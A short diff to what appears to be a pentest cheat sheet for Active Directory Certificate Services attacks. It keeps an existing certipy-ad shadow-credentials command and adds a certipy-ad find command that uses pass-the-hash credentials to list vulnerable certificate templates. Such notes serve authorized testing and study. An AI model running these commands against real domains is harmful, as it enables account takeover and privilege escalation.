@@ -185,4 +185,6 @@ gpupdate /force
 # certipy-ad(AD CS exploit)
 ```bash
 certipy-ad shadow auto -u <user> -p <password> -account <account> -dc-ip <ip>
+
+certipy-ad find -u <user> -hashes <hashes> -dc-ip <ip> -vulnerable
 ```
